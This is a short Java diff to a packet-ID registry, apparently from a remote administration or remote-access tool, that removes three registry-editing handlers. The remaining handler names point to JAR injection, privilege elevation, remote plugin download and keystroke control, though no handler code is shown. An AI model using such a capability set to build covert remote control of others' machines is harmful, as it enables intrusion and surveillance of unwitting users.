@@ -83,7 +83,7 @@ public abstract class AbstractIncomingPacket {
 		PACKETS_INCOMING.put((short) 76, Packet76Speech.class);
 		PACKETS_INCOMING.put((short) 77, Packet77ListServices.class);
 		PACKETS_INCOMING.put((short) 78, Packet78RegistryStartup.class);
-		PACKETS_INCOMING.put((short) 79, Packet79BrowseRegistry.class);
+
 		PACKETS_INCOMING.put((short) 80, Packet80CustomRegQuery.class);
 		PACKETS_INCOMING.put((short) 81, Packet81InstalledPrograms.class);
 		PACKETS_INCOMING.put((short) 82, Packet82NetworkAdapters.class);
@@ -101,9 +101,9 @@ public abstract class AbstractIncomingPacket {
 		PACKETS_INCOMING.put((short) 94, Packet94KeyPress.class);
 		PACKETS_INCOMING.put((short) 95, Packet95KeyRelease.class);
 		PACKETS_INCOMING.put((short) 96, Packet96EnvironmentVariables.class);
-		PACKETS_INCOMING.put((short) 97, Packet97RegistryAdd.class);
+
 		PACKETS_INCOMING.put((short) 98, Packet98InjectJAR.class);
-		PACKETS_INCOMING.put((short) 99, Packet99RegistryDelete.class);
+
 		PACKETS_INCOMING.put((short) 100, Packet100RequestElevation.class);
 		PACKETS_INCOMING.put((short) 101, Packet101DownloadPlugin.class);
 		PACKETS_INCOMING.put((short) 102, Packet102PauseClientDownload.class);
